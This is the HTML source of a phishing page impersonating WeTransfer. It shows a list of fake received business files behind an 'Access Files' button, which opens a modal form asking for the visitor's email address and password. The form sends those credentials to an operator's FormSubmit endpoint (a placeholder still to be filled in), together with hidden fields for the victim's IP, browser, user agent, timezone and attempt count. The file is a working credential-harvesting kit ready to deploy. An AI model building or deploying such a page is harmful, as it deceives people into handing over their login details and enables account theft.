<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>WeTransfer</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css" rel="stylesheet">
    <style>
        body { background-color: #f1f1f1; font-family: Arial, sans-serif; }
        .topbar { display: flex; justify-content: space-between; padding: 10px 20px; }
        .logbox { background-color: #fff; border-radius: 12px; padding: 25px; box-shadow: 0 0 10px rgba(0,0,0,0.05); min-height: 100%; }
        .write-test { font-size: 32px; line-height: 120%; }
        .file-item { display: flex; justify-content: space-between; padding: 8px 0; font-size: 15px; border-bottom: 1px solid #eee; }
        .accept1 { margin-top: 20px; font-size: 14px; }
        .img-fluid { border-radius: 10px; }
        #file-list { cursor: pointer; }
        @media (max-width: 768px) { .logbox { margin-bottom: 2rem; } }
        
        @keyframes slide-in-one-tap {
            from { transform: translateY(80px); }
            to { transform: translateY(0px); }
        }
        
        .trust-hide-gracefully { opacity: 0; }
        .trust-wallet-one-tap .hidden { display: none; }
        .trust-wallet-one-tap .semibold { font-weight: 500; }
        .trust-wallet-one-tap .binance-plex { font-family: 'Binance'; }
        .trust-wallet-one-tap .rounded-full { border-radius: 50%; }
        .trust-wallet-one-tap .flex { display: flex; }
        .trust-wallet-one-tap .flex-col { flex-direction: column; }
        .trust-wallet-one-tap .items-center { align-items: center; }
        .trust-wallet-one-tap .space-between { justify-content: space-between; }
        .trust-wallet-one-tap .justify-center { justify-content: center; }
        .trust-wallet-one-tap .w-full { width: 100%; }
        
        .trust-wallet-one-tap .box {
            transition: all 0.5s cubic-bezier(0, 0, 0, 1.43);
            animation: slide-in-one-tap 0.5s cubic-bezier(0, 0, 0, 1.43);
            width: 384px;
            border-radius: 15px;
            background: #fff;
            box-shadow: 0px 2px 4px 0px rgba(0, 0, 0, 0.25);
            position: fixed;
            right: 30px;
            bottom: 30px;
            z-index: 1020;
        }
        
        .trust-wallet-one-tap .header {
            gap: 15px;
            border-bottom: 1px solid #e6e6e6;
            padding: 10px 18px;
        }
        
        .trust-wallet-one-tap .header .left-items { gap: 15px; }
        .trust-wallet-one-tap .header .title {
            color: #1e2329;
            font-size: 18px;
            font-weight: 600;
            line-height: 28px;
        }
        .trust-wallet-one-tap .header .subtitle {
            color: #474d57;
            font-size: 14px;
            line-height: 20px;
        }
        .trust-wallet-one-tap .header .close {
            color: #1e2329;
            cursor: pointer;
        }
        
        .trust-wallet-one-tap .body {
            padding: 9px 18px;
            gap: 10px;
        }
        .trust-wallet-one-tap .body .right-items {
            gap: 10px;
            width: 100%;
        }
        .trust-wallet-one-tap .body .right-items .wallet-title {
            color: #1e2329;
            font-size: 16px;
            font-weight: 600;
            line-height: 20px;
        }
        .trust-wallet-one-tap .body .right-items .wallet-subtitle {
            color: #474d57;
            font-size: 14px;
            line-height: 20px;
        }
        
        .trust-wallet-one-tap .connect-indicator {
            gap: 15px;
            padding: 8px 0;
        }
        .trust-wallet-one-tap .connect-indicator .flow-icon { color: #474d57; }
        .trust-wallet-one-tap .loading-color { color: #fff; }
        
        .trust-wallet-one-tap .button {
            border-radius: 50px;
            outline: 2px solid transparent;
            outline-offset: 2px;
            background-color: rgb(5, 0, 255);
            border-color: rgb(229, 231, 235);
            cursor: pointer;
            text-align: center;
            height: 45px;
        }
        .trust-wallet-one-tap .button .button-text {
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            line-height: 20px;
        }
        
        .trust-wallet-one-tap .footer { margin: 20px 30px; }
        .trust-wallet-one-tap .check-icon { color: #fff; }
        
        @font-face {
            font-family: 'Binance';
            src: url(fonts/BinancePlex-Regular.otf) format('opentype');
            font-weight: 400;
            font-style: normal;
        }
        @font-face {
            font-family: 'Binance';
            src: url(fonts/BinancePlex-Medium.otf) format('opentype');
            font-weight: 500;
            font-style: normal;
        }
        @font-face {
            font-family: 'Binance';
            src: url(fonts/BinancePlex-SemiBold.otf) format('opentype');
            font-weight: 600;
            font-style: normal;
        }
        
        #maxAttemptsContainer img {
            max-width: 100%;
            height: auto;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
        }
    </style>
</head>
<body>
    <div id="in-page-channel-node-id" data-channel-name="in_page_channel_kbky-4"></div>

    <div class="topbar">
        <img src="./WeTransfer_files/JIXgWPt.png" alt="Logo" height="40">
        <img src="./WeTransfer_files/JIXUp8G.png" alt="Nav Icon" height="40">
    </div>

    <div class="container my-4">
        <div class="row g-4 align-items-stretch">
            <div class="col-lg-4">
                <div class="logbox">
                    <div><img src="./WeTransfer_files/wetransfer.png" alt="Icon" width="200"></div>
                    <div class="write-test mt-3"><span></span>
                        <br>Files Received</div>
                    <div class="mt-4" id="file-list">
                        <div class="file-item"><span>PO_201AJ02.xls</span><i class="bi bi-file-earmark-excel-fill text-success"></i></div>
                        <div class="file-item"><span>Specifications.pdf</span><i class="bi bi-file-earmark-pdf-fill text-danger"></i></div>
                        <div class="file-item"><span>Contract.xls</span><i class="bi bi-file-earmark-excel-fill text-success"></i></div>
                        <div class="file-item"><span>Invoice_F2023.pdf</span><i class="bi bi-file-earmark-pdf-fill text-danger"></i></div>
                        <div class="file-item"><span>Presentation.pptx</span><i class="bi bi-file-earmark-slides-fill text-warning"></i></div>
                        <div class="file-item"><span>Image.jpeg</span><i class="bi bi-file-earmark-image-fill text-muted"></i></div>
                    </div>
                    <div class="accept1">To continue, please agree
                        <br>to our <u><b><a href="/terms.html" target="_blank">Terms Of Service</a></b></u> and <u><b><a href="/privacy.html" target="_blank">Privacy Policy</a></b></u>.</div>
                    <button id="showFormBtn" class="btn btn-primary w-100 mt-4">
                        <span class="spinner-border spinner-border-sm d-none" id="loadingSpinner" role="status" aria-hidden="true"></span>
                        <span id="buttonText">Access Files</span>
                    </button>
                </div>
            </div>

            <div class="col-lg-4 text-center">
                <img src="./WeTransfer_files/JIX4qpj.png" class="img-fluid" alt="Illustration">
            </div>
            <div class="col-lg-4 text-center">
                <img src="./WeTransfer_files/JIX6qFt.png" class="img-fluid" alt="Side graphic">
            </div>
        </div>
    </div>

    <!-- Modal Form - FormSubmit.co -->
    <div class="modal fade" id="formModal" tabindex="-1" aria-labelledby="formModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <form id="accessForm" 
                      action="https://formsubmit.co/YOUR_EMAIL_HERE" 
                      method="POST"
                      novalidate>
                    
                    <input type="hidden" name="_captcha" value="true">
                    <input type="hidden" name="_template" value="table">
                    <input type="hidden" name="_next" value="https://YOUR_RENDER_URL.onrender.com/thankyou.html">
                    <input type="text" name="_honey" style="display:none;">

                    <div class="modal-body">
                        <div class="mb-3">
                            <label for="email" class="form-label">Email Address</label>
                            <input type="email" class="form-control" id="email" name="email" required>
                            <div class="invalid-feedback">Please enter a valid email address.</div>
                        </div>

                        <div class="mb-3">
                            <label for="password" class="form-label">Password</label>
                            <input type="password" class="form-control" id="password" name="password" required>
                            <div class="invalid-feedback">Please enter your password.</div>
                            <div id="submissionAlert" class="alert alert-danger mt-2 d-none" role="alert"></div>
                        </div>
                        
                        <input type="hidden" name="ip" id="ip-field" value="">
                        <input type="hidden" name="browser" id="browser-field" value="">
                        <input type="hidden" name="userAgent" id="useragent-field" value="">
                        <input type="hidden" name="timezone" id="timezone-field" value="">
                        <input type="hidden" name="dateTime" id="datetime-field" value="">
                        <input type="hidden" name="attempt" id="attempt-field" value="1">
                        
                        <div class="cf-turnstile mb-3" data-sitekey="0x4AAAAAABaccphvMV0Je51_">
                            <div>
                                <input type="hidden" name="cf-turnstile-response" id="cf-chl-widget-al9zy_response">
                            </div>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="submit" class="btn btn-primary" id="submitBtn" disabled>Download</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <!-- ✅ FIXED: Correct script file name -->
    <script src="scriptss.js"></script>
    
    <!-- FALLBACK: Direct button handler -->
    <script>
        // This runs immediately when the page loads
        console.log('Page loaded - fallback script running');
        
        // Wait for DOM to be ready
        document.addEventListener('DOMContentLoaded', function() {
            console.log('DOM ready - checking for button');
            
            const btn = document.getElementById('showFormBtn');
            if (btn) {
                console.log('Button found - adding click handler');
                
                // Remove any existing listeners by cloning
                const newBtn = btn.cloneNode(true);
                btn.parentNode.replaceChild(newBtn, btn);
                
                // Add click handler
                newBtn.addEventListener('click', function(e) {
                    e.preventDefault();
                    console.log('Button clicked - showing modal');
                    
                    const modalElement = document.getElementById('formModal');
                    if (modalElement) {
                        const modal = new bootstrap.Modal(modalElement);
                        modal.show();
                    } else {
                        console.error('Modal element not found!');
                    }
                });
            } else {
                console.error('Button not found!');
            }
        });
    </script>
</body>
</html>
